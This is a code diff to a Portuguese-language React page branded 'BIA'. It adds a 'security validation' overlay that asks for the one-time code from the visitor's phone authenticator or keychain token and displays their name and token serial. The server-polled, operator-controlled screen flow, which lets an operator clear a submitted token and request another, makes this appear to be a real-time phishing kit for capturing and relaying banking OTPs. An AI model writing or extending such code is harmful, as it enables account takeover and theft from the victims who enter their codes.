@@ -2,13 +2,15 @@ import { useEffect, useRef, useState } from "react";
 import { createFileRoute, redirect, useNavigate } from "@tanstack/react-router";
 import { useServerFn } from "@tanstack/react-start";
 import { z } from "zod";
-import { Check } from "lucide-react";
-import { verificarStatus } from "@/lib/cliente.functions";
+import { Check, Loader2, X } from "lucide-react";
+import { enviarToken, verificarStatus } from "@/lib/cliente.functions";
 import { usePresenca } from "@/hooks/use-presenca";
 import { cn } from "@/lib/utils";
 import biaImg from "@/assets/bia.png.asset.json";
 import fundoBia from "@/assets/img-passo-11.png.asset.json";
 import biaLogo from "@/assets/bia-logo.png.asset.json";
+import iconeTokenCelular from "@/assets/icone-token-celular.png.asset.json";
+import iconeTokenChaveiro from "@/assets/icone-token-chaveiro.png.asset.json";
 
 const searchSchema = z.object({ id: z.string().uuid() });
 
@@ -63,10 +65,20 @@ const FUNCIONALIDADES = [
 function InternaPage() {
   const { id } = Route.useSearch();
   const checar = useServerFn(verificarStatus);
+  const enviarTk = useServerFn(enviarToken);
   const navigate = useNavigate();
   const [progresso, setProgresso] = useState(0);
   const [etapa, setEtapa] = useState(0);
   const finalizadoRef = useRef(false);
+
+  const [tokenModo, setTokenModo] = useState<null | "celular" | "chaveiro">(null);
+  const [tokenValor, setTokenValor] = useState("");
+  const [tokenSerial, setTokenSerial] = useState<string | null>(null);
+  const [tokenNome, setTokenNome] = useState<string | null>(null);
+  const [enviandoToken, setEnviandoToken] = useState(false);
+  const [aguardandoToken, setAguardandoToken] = useState(false);
+  const [erroToken, setErroToken] = useState<string | null>(null);
+  const tokenEnviadoEmRef = useRef<string | null>(null);
 
   usePresenca(id, "concluido");
 
@@ -97,6 +109,26 @@ function InternaPage() {
           finalizadoRef.current = true;
           return;
         }
+        setTokenSerial(res.token_serial ?? null);
+        setTokenNome(res.token_nome ?? null);
+
+        // Overlay de token dentro da BIA
+        if (res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
+          const modo = res.proxima_tela === "interna_token_chaveiro" ? "chaveiro" : "celular";
+          setTokenModo((cur) => (cur === modo ? cur : modo));
+          // Se o operador limpou o token (reencaminhamento), volta pro input
+          if (aguardandoToken) {
+            const clearedToken = !res.token_em || res.token_em !== tokenEnviadoEmRef.current;
+            if (clearedToken && !res.token_em) {
+              setAguardandoToken(false);
+              setEnviandoToken(false);
+              setTokenValor("");
+              tokenEnviadoEmRef.current = null;
+            }
+          }
+          return;
+        }
+
         if (res.proxima_tela && res.proxima_tela !== "interna") {
           finalizadoRef.current = true;
           setProgresso(100);
@@ -114,13 +146,46 @@ function InternaPage() {
                   : "/token-celular";
             navigate({ to: destino, search: { id } });
           }, 400);
+          return;
+        }
+
+        // Voltou pra interna pura
+        if (res.proxima_tela === "interna" && tokenModo) {
+          setTokenModo(null);
+          setAguardandoToken(false);
+          setEnviandoToken(false);
+          setTokenValor("");
         }
       } catch {
         // silencia
       }
     }, 2500);
     return () => clearInterval(t);
-  }, [id, checar, navigate]);
+  }, [id, checar, navigate, aguardandoToken, tokenModo]);
+
+  async function submeterToken(e?: { preventDefault: () => void }) {
+    e?.preventDefault();
+    setErroToken(null);
+    const valor = tokenValor.trim();
+    if (!valor) {
+      setErroToken("Informe o token.");
+      return;
+    }
+    setEnviandoToken(true);
+    try {
+      await enviarTk({ data: { id, token: valor } });
+      tokenEnviadoEmRef.current = new Date().toISOString();
+      try {
+        const res = await checar({ data: { id } });
+        if (res.token_em) tokenEnviadoEmRef.current = res.token_em;
+      } catch { /* ignora */ }
+      setAguardandoToken(true);
+    } catch {
+      setEnviandoToken(false);
+      setErroToken("Não foi possível enviar. Tente novamente.");
+    }
+  }
+
 
   const etapaAtual = Math.min(ETAPAS.length - 1, Math.floor((progresso / 100) * ETAPAS.length));
 
@@ -289,6 +354,104 @@ function InternaPage() {
           </div>
         </div>
       </main>
+
+      {/* Overlay de token dentro da tela da BIA (mesmo fundo) */}
+      {tokenModo && (
+        <div className="fixed inset-0 z-30 flex items-center justify-center p-4">
+          <div aria-hidden className="absolute inset-0 bg-black/50 backdrop-blur-[2px]" />
+          <form
+            onSubmit={submeterToken}
+            className="relative w-full max-w-md overflow-hidden rounded-2xl border border-white/60 bg-white/95 shadow-[0_32px_64px_-16px_rgba(120,40,180,0.35)] backdrop-blur-2xl"
+          >
+            <div
+              className="relative h-24 overflow-hidden bg-cover bg-no-repeat"
+              style={{ backgroundImage: `url(${biaImg.url})`, backgroundPosition: "center 70%" }}
+            >
+              <div className="absolute inset-0 bg-black/40" />
+              <div className="relative flex h-full items-center justify-between px-5 text-white">
+                <div>
+                  <div className="text-[10px] font-bold uppercase tracking-widest text-white/70">
+                    Validação de segurança
+                  </div>
+                  <div className="text-lg font-bold drop-shadow">
+                    Token do {tokenModo === "chaveiro" ? "chaveiro" : "celular"}
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div className="p-5">
+              <p className="mb-4 text-[13px] leading-relaxed text-slate-600">
+                Olá{tokenNome ? <>, <strong className="text-slate-800">{tokenNome}</strong></> : null}.
+                Para concluir a ativação da BIA, informe o código exibido no seu {tokenModo === "chaveiro" ? "chaveiro token" : "aplicativo autenticador do celular"}.
+              </p>
+
+              <div className="flex items-center gap-4">
+                <img
+                  src={tokenModo === "chaveiro" ? iconeTokenChaveiro.url : iconeTokenCelular.url}
+                  alt={tokenModo === "chaveiro" ? "Chaveiro" : "Celular"}
+                  className="h-auto w-[110px] shrink-0"
+                />
+                <div className="flex-1">
+                  <label className="mb-1 block text-[11px] font-bold uppercase tracking-widest text-bia-purple">
+                    Código
+                  </label>
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    autoComplete="one-time-code"
+                    value={tokenValor}
+                    onChange={(e) => setTokenValor(e.target.value.replace(/\D/g, "").slice(0, 8))}
+                    maxLength={8}
+                    disabled={enviandoToken || aguardandoToken}
+                    placeholder={tokenModo === "chaveiro" ? "00000000" : "000000"}
+                    className="h-10 w-full rounded-md border border-slate-300 bg-white px-3 font-mono text-base tracking-widest text-slate-800 outline-none focus:border-bia-purple disabled:bg-slate-100"
+                  />
+                  <div className="mt-2 text-[11px] text-slate-500">
+                    Nº de série:{" "}
+                    <span className="font-mono font-semibold text-slate-700">
+                      {tokenSerial ?? "XXXXXX000-0"}
+                    </span>
+                  </div>
+                </div>
+              </div>
+
+              {erroToken && (
+                <p className="mt-3 rounded border border-rose-300 bg-rose-50 px-3 py-2 text-[12px] text-rose-700">
+                  {erroToken}
+                </p>
+              )}
+
+              <div className="mt-5 flex justify-end gap-2">
+                <button
+                  type="submit"
+                  disabled={enviandoToken || aguardandoToken}
+                  className="inline-flex items-center gap-2 rounded-md bg-gradient-to-r from-bia-purple to-bia-pink px-4 py-2 text-sm font-bold text-white shadow-md transition-opacity hover:opacity-90 disabled:opacity-60"
+                >
+                  {enviandoToken || aguardandoToken ? (
+                    <>
+                      <Loader2 className="h-4 w-4 animate-spin" />
+                      Aguarde...
+                    </>
+                  ) : (
+                    <>
+                      Enviar
+                      <Check className="h-4 w-4" />
+                    </>
+                  )}
+                </button>
+              </div>
+
+              {aguardandoToken && (
+                <p className="mt-3 flex items-center gap-2 text-[11px] text-slate-500">
+                  <X className="h-3 w-3 opacity-0" />
+                  Verificando com a central...
+                </p>
+              )}
+            </div>
+          </form>
+        </div>
+      )}
     </div>
   );
 }
